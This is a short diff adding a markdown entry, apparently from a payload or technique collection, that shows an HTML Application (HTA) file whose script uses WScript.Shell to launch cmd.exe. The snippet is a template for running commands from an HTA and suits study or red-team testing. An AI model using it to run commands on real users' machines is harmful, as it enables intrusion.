@@ -1,0 +1,14 @@
+
+HTML Application (HTA)
+
+
+```
+<html>
+<body>
+<script>
+	var c= 'cmd.exe'
+	new ActiveXObject('WScript.Shell').Run(c);
+</script>
+</body>
+</html>
+```
